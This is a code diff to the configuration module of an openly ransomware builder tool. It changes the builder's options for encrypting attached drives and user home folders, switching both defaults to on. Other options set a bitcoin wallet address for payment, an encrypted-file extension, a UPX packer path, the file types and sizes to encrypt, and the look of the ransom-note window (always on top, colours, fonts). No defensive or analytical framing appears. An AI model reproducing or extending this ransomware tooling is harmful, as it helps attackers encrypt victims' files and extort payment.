@@ -108,19 +108,6 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             }
     ),
     (
-        "upx_dir", {
-            "label": "UPX Packer Directory",
-            "label_object_name": "UpxDirLabel",
-            "input_object_name": "UpxDirPicker",
-            "regex": re.compile("^.*$"),
-            "example": "C:\\Program Files\\upx394w",
-            "input_requirement": "A path pointing to the UPX Packer directory",
-            "default": "",
-            "validate": True,
-            "config_area": "Binary Settings"
-            }
-    ),
-    (
         "icon_file", {
             "label": "Icon",
             "label_object_name": "IconLabel",
@@ -134,48 +121,16 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             }
     ),
     (
-        "encrypt_attached_drives", {
-            "label": "Encrypt Attached Drives",
-            "input_object_name": "EncryptAttachedDrivesCheckbox",
-            "default": False,
-            "validate": False,
-            "config_area": "Ransomware Settings"
-            }
-    ),
-    (
-        "encrypt_user_home", {
-            "label": "Encrypt User Home",
-            "input_object_name": "EncryptUserHomeCheckbox",
-            "default": False,
-            "validate": False,
-            "config_area": "Ransomware Settings"
-            }
-    ),
-    (
-        "encrypted_file_extension", {
-            "label": "Encrypted File Extension",
-            "label_object_name": "EncryptedFileExtensionLabel",
-            "input_object_name": "EncryptedFileExtensionTextCtrl",
-            "regex": re.compile("^[A-Za-z0-9.]*$"),
-            "example": "locked",
-            "input_requirement": "A series of alphanumeric character(s)",
-            "config_area": "Ransomware Settings",
+        "upx_dir", {
+            "label": "UPX Packer Directory",
+            "label_object_name": "UpxDirLabel",
+            "input_object_name": "UpxDirPicker",
+            "regex": re.compile("^.*$"),
+            "example": "C:\\Program Files\\upx394w",
+            "input_requirement": "A path pointing to the UPX Packer directory",
+            "default": "",
             "validate": True,
-            "default": "locked"
-            }
-    ),
-    (
-        "wallet_address", {
-            "label": "Wallet Address",
-            "label_object_name": "WalletAddressLabel",
-            "input_object_name": "WalletAddressTextCtrl",
-            "regex": re.compile("^([A-Za-z0-9]{26,35})?$"),
-            "example": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay",
-            "input_requirement": "A bitcoin wallet address as a series of alphanumeric" 
-                                 " characters (26-35 characters in length",
-            "config_area": "Ransomware Settings",
-            "validate": True,
-            "default": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
+            "config_area": "Binary Settings"
             }
     ),
     (
@@ -205,6 +160,38 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             }
     ),
     (
+        "wallet_address", {
+            "label": "Wallet Address",
+            "label_object_name": "WalletAddressLabel",
+            "input_object_name": "WalletAddressTextCtrl",
+            "regex": re.compile("^([A-Za-z0-9]{26,35})?$"),
+            "example": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay",
+            "input_requirement": "A bitcoin wallet address as a series of alphanumeric" 
+                                 " characters (26-35 characters in length",
+            "config_area": "Ransomware Settings",
+            "validate": True,
+            "default": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
+            }
+    ),
+    (
+        "encrypt_attached_drives", {
+            "label": "Encrypt Attached Drives",
+            "input_object_name": "EncryptAttachedDrivesCheckbox",
+            "default": True,
+            "validate": False,
+            "config_area": "Ransomware Settings"
+            }
+    ),
+    (
+        "encrypt_user_home", {
+            "label": "Encrypt User Home",
+            "input_object_name": "EncryptUserHomeCheckbox",
+            "default": True,
+            "validate": False,
+            "config_area": "Ransomware Settings"
+            }
+    ),
+    (
         "max_file_size_to_encrypt", {
             "label": "Max File Size to Encrypt",
             "label_object_name": "MaxFileSizeLabel",
@@ -229,6 +216,69 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "validate": True,
             "default": ",".join(ENCRYPTABLE_FILETYPES)
         }
+    ),
+    (
+        "encrypted_file_extension", {
+            "label": "Encrypted File Extension",
+            "label_object_name": "EncryptedFileExtensionLabel",
+            "input_object_name": "EncryptedFileExtensionTextCtrl",
+            "regex": re.compile("^[A-Za-z0-9.]*$"),
+            "example": "locked",
+            "input_requirement": "A series of alphanumeric character(s)",
+            "config_area": "Ransomware Settings",
+            "validate": True,
+            "default": "locked"
+            }
+    ),
+    (
+        "make_gui_resizeable", {
+            "label": "Make GUI Resizeable",
+            "input_object_name": "MakeGuiResizeableCheckbox",
+            "default": False,
+            "validate": False,
+            "config_area": "Ransomware Settings"
+            }
+    ),
+    (
+        "always_on_top", {
+            "label": "Always On Top",
+            "input_object_name": "AlwaysOnTopCheckbox",
+            "default": False,
+            "validate": False,
+            "config_area": "Ransomware Settings"
+            }
+    ),
+    (
+        "background_colour", {
+            "label": "Background Colour",
+            "input_object_name": "BackgroundColourPicker",
+            "validate": False,
+            "config_area": "Ransomware Settings"
+            }
+    ),
+    (
+        "heading_font_colour", {
+            "label": "Heading Font Colour",
+            "input_object_name": "HeadingFontColourPicker",
+            "validate": False,
+            "config_area": "Ransomware Settings"
+            }
+    ),
+    (
+        "primary_font_colour", {
+            "label": "Primary Font Colour",
+            "input_object_name": "PrimaryFontColourPicker",
+            "validate": False,
+            "config_area": "Ransomware Settings"
+            }
+    ),
+    (
+        "secondary_font_colour", {
+            "label": "Secondary Font Colour",
+            "input_object_name": "SecondaryFontColourPicker",
+            "validate": False,
+            "config_area": "Ransomware Settings"
+            }
     ),
     (
         "ransom_message", {
@@ -257,6 +307,12 @@ RUNTIME_CONFIG_ITEMS = [
     "max_file_size_to_encrypt",
     "filetypes_to_encrypt",
     "ransom_message",
+    "make_gui_resizeable",
+    "always_on_top",
+    "background_colour",
+    "heading_font_colour",
+    "primary_font_colour",
+    "secondary_font_colour"
     ]
 
 RUNTIME_CONFIG_PATH = "Resources/runtime.cfg"
